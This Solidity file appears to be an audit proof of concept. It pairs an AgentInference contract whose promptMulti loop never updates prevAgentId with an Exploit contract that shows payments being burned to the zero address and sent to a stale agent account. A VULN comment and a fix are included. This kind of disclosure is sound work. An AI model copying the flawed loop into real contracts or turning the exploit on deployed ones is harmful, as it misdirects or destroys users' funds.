// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract Token { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address t,uint256 a) external{balanceOf[t]+=a;} function approve(address s,uint256 a) external{allowance[msg.sender][s]=a;} function transferFrom(address f,address t,uint256 a) external{allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;} }
contract AgentNft { mapping(uint256=>address) public tba; function setTba(uint256 id,address a) external {tba[id]=a;} }
contract Vault {}
contract AgentInference {
    Token public token; AgentNft public agentNft; mapping(uint256=>uint256) public inferenceCount;
    constructor(Token t,AgentNft a){token=t;agentNft=a;}
    function promptMulti(address sender,uint256[] calldata agentIds,uint256[] calldata amounts) external {
        uint256 prevAgentId=0; address agentTba=address(0);
        for(uint256 i;i<agentIds.length;i++) { uint256 agentId=agentIds[i];
            if(prevAgentId!=agentId) { agentTba=agentNft.tba(agentId); }
            token.transferFrom(sender,agentTba,amounts[i]); // @> VULN: prevAgentId is never updated, so ID 0 burns and recurring IDs use stale TBA
            // FIX: prevAgentId = agentId; after loading agentTba, and require agentTba != address(0).
            inferenceCount[agentId]++;
        }
    }
}
contract Exploit {
    Token public token; AgentNft public registry; Vault public vault0; Vault public vault1; AgentInference public inference;
    uint256 public burned; uint256 public misdirected;
    constructor(){token=new Token();registry=new AgentNft();vault0=new Vault();vault1=new Vault();inference=new AgentInference(token,registry);registry.setTba(0,address(vault0));registry.setTba(1,address(vault1));token.mint(address(this),60);}
    function run() external { token.approve(address(inference),60); uint256[] memory ids=new uint256[](3); ids[0]=0;ids[1]=1;ids[2]=0; uint256[] memory amounts=new uint256[](3);amounts[0]=10;amounts[1]=20;amounts[2]=30; inference.promptMulti(address(this),ids,amounts); burned=token.balanceOf(address(0)); misdirected=token.balanceOf(address(vault1)); require(burned==10,"first payment not burned"); require(token.balanceOf(address(vault0))==0,"agent zero unexpectedly paid"); require(misdirected==50,"payments not sent to stale tba"); }
}
